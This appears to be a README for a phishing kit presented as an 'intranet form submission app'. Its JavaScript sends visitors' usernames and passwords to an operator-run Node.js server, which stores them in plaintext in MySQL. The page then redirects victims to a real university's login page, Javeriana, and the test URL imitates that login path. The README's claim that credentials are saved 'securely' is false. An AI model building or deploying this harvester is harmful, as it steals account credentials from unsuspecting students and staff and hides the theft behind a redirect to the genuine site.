
# **Intranet Form Submission App**

This project provides a setup for a form hosted on an IIS server that interacts with a Dockerized Node.js backend and a MySQL database. It saves user credentials securely in the database when the form is submitted and redirects the user upon successful submission.

## **Features**
- **Form Submission**: Collects user credentials (username and password) from a form.
- **Backend API**: Node.js app handles form submissions and stores data in a MySQL database.
- **Redirection**: Redirects the user to a specified URL upon successful submission.
- **Dockerized Setup**: Backend and database are containerized for easy deployment.

---

## **Project Structure**
```
.
├── server.js               # Node.js application backend
├── Dockerfile              # Dockerfile for Node.js app
├── docker-compose.yml      # Docker Compose configuration for app and database
├── public/                 # Static assets, including the HTML form
├── init.sql                # SQL script to initialize the database
└── README.md               # Project documentation
```

---

## **Requirements**
- **Docker** and **Docker Compose** installed on your system.
- IIS server to host the HTML form.
- MySQL client (optional, for database inspection).

---

## **Setup Instructions**

### **Step 1: Clone the Repository**
```bash
git clone <REPOSITORY_URL>
cd <PROJECT_DIRECTORY>
```

### **Step 2: Build and Start Docker Containers**
Ensure Docker is running, then execute:
```bash
docker-compose up --build
```

This will:
- Build and start the Node.js app on `http://localhost:4000`.
- Set up a MySQL database with the required schema.

### **Step 3: Host the Form on IIS**
1. Copy the HTML form to your IIS server’s hosting directory.
2. Ensure the form’s `<form>` tag or JavaScript code points to the Node.js backend. **Update the IP address in the JavaScript `submitForm` function to match the IIS server's IP.** For example:
   ```javascript
   async function submitForm(event) {
       event.preventDefault();

       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;

       if (!username || !password) {
           alert("Please enter both username and password.");
           return;
       }

       try {
           const response = await fetch('http://<IIS_SERVER_IP>:4000/save-credentials', {
               method: 'POST',
               headers: {
                   'Content-Type': 'application/json',
               },
               body: JSON.stringify({ username, password }),
           });

           if (response.ok) {
               const result = await response.json();
               alert(result.message || 'Credentials saved successfully.');

               // Redirect to the specified URL on success
               window.location.href = 'https://acceso.javeriana.edu.co/menu/login3_v2.html?bmctx=A04E6915505F18E099136E72C9264584664C73087CD21469F3540EEF40735E67&password=secure_string&contextType=external&username=string&challenge_url=https%3A%2F%2Facceso.javeriana.edu.co%2Fmenu%2Flogin3_v2.html&request_id=-1917398409814472959&authn_try_count=0&locale=es_419&resource_url=http%253A%252F%252Fintranet.javeriana.edu.co%252Finicio';
           } else {
               const error = await response.json();
               alert(error.message || 'An error occurred.');
           }
       } catch (err) {
           console.error('Error connecting to the server:', err);
           alert('Failed to connect to the server.');
       }
   }
   ```
   Replace `<IIS_SERVER_IP>` with the actual IP address of the IIS server (e.g., `192.168.124.1`).

3. Open the form in your browser via the IIS server’s URL.

### **Step 4: Test the Setup**
1. Access the form through IIS, e.g., `http://192.168.124.1:443/menu/login3_v2bc9b.html`.
2. Submit the form with a username and password.
3. Verify the data is saved in the database and the user is redirected to the specified URL.

---

## **Usage**

### **Access the Node.js App**
- Base URL: `http://localhost:4000`
- API Endpoint: `POST /save-credentials`

### **Database Information**
- MySQL credentials are configured in the `docker-compose.yml` file:
  ```yaml
  MYSQL_ROOT_PASSWORD: 123
  MYSQL_DATABASE: credentials
  ```
- Default table structure:
  ```sql
  CREATE TABLE users (
      id INT AUTO_INCREMENT PRIMARY KEY,
      username VARCHAR(255) NOT NULL,
      password VARCHAR(255) NOT NULL
  );
  ```

---

## **Troubleshooting**

### Common Issues:
- **CORS Errors**: Ensure the Node.js backend allows requests from the IIS server origin.
- **Port Conflicts**: Check if ports (4000 for Node.js, 3306 for MySQL) are in use.
- **Form Not Submitting**: Ensure the `action` URL or fetch URL in the HTML form points to the correct Node.js server address.

### Logs:
- View Node.js app logs:
  ```bash
  docker logs <NODE_CONTAINER_NAME>
  ```
- Access MySQL container:
  ```bash
  docker exec -it <MYSQL_CONTAINER_NAME> mysql -uroot -p
  ```

---

## **Contributing**
Feel free to submit issues or contribute by creating a pull request.

---

## **License**
This project is licensed under the MIT License.
